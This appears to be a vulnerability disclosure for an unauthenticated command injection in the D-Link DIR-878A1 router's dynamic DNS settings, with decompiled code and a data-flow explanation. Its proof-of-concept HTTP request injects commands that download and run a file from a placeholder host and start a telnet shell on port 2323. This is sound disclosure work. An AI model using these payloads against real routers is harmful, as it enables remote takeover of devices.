# Command Injection Vulnerability in `SetDynamicDNSSettings`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-878A1 Router                                      |
| Firmware Version     | **FW101B04.bin** (other versions require verification)       |
| Vulnerability Type   | **Unauthenticated Command Injection**                        |
| Vulnerable Component | `prog.cgi` (parameter processing) â†’ `rc` (command execution) |
| Prerequisites        | No authentication required (remote exploitation possible)    |

2. Exploitation Path

```c
// prog.cgi
int __fastcall sub_444CC4(int a1)
{
  ...
  if ( v6 == 1 )
  {
    ...
    v8 = webGetVarString(a1, "/SetDynamicDNSSettings/ServerAddress");
    if ( v8 )
    {
      nvram_safe_set("DDNSProvider", v8);
      v1 = webGetVarString(a1, "/SetDynamicDNSSettings/Hostname");
      if ( v1 )
      {
        nvram_safe_set("DDNS", v1);
        ...
}

// rc
int start_DDNS_ipv4()
{
  ...
  v6 = (const char *)nvram_safe_get("DDNSProvider");
  v7 = (const char *)nvram_safe_get("DDNS");
  ...
  if ( v5 == 1 )
  {
    result = *(unsigned __int8 *)v6;
    if ( *v6 )
    {
      result = *(unsigned __int8 *)v7;
      if ( *v7 )
      {
        result = (unsigned __int8)*v8;
        if ( *v8 )
        {
          result = (unsigned __int8)*v9;
          if ( *v9 )
          {
            if ( !strcmp(v6, "dyndns.org") || !strcmp(v6, "dyndns.com") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@dyndns.org "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else if ( !strcmp(v6, "oray.cn") || !strcmp(v6, "oray.com") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_server_name ddns.oray.com "
                "--dyndns_server_url /ph/update? --update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else if ( !strcmp(v6, "dlinkddns.org") || !strcmp(v6, "dlinkddns.com") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@dlinkddns.com "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else if ( strstr(v6, "no-ip") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@no-ip.com "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@%s "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v6,
                v10);
            }
            system("echo 1 > /tmp/ddnstate");
            return twsystem(v14, 1);
          }
        }
      }
    }
  }
  return result;
}
```

3. **Vulnerable Binaries:** `prog.cgi` and `rc`; the data flow traverses across these binaries.

4. 0-Day Command Injection Exploitation Path:

   - In `prog.cgi`, line 8: `v8 = webGetVarString(a1, "/SetDynamicDNSSettings/ServerAddress")` receives user input, which is temporarily stored via line 11: `nvram_safe_set("DDNSProvider", v8)`. In `rc`, line 23: `v6 = (const char *)nvram_safe_get("DDNSProvider")` retrieves the stored value, which is concatenated and passed to line 102: `return twsystem(v14, 1)`, resulting in command injection. The current logic only compares `v6` against a specific string, but this does not prevent command injection.

   - In `prog.cgi`, line 12: `v1 = webGetVarString(a1, "/SetDynamicDNSSettings/Hostname")` receives user input, which is temporarily stored via line 15: `nvram_safe_set("DDNS", v1)`. In `rc`, line 24: `v7 = (const char *)nvram_safe_get("DDNS")` retrieves the stored value, which is concatenated and passed to line 102: `return twsystem(v14, 1)`, resulting in command injection.

5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```http
POST /cgi-bin/prog.cgi HTTP/1.1
Host: 192.168.0.1
Content-Type: application/xml

<!-- ServerAddress Injection -->
<SetDynamicDNSSettings>
    <ServerAddress>attacker.com'; wget http://malware.site/exp -O /tmp/exp; 
    sh /tmp/exp;'</ServerAddress>
    <Hostname>normal.host</Hostname>
</SetDynamicDNSSettings>

<!-- Hostname Injection -->
<SetDynamicDNSSettings>
    <ServerAddress>dlinkddns.com</ServerAddress>
    <Hostname>mal.host; killall telnetd; telnetd -l /bin/sh -p 2323;</Hostname>
</SetDynamicDNSSettings>
```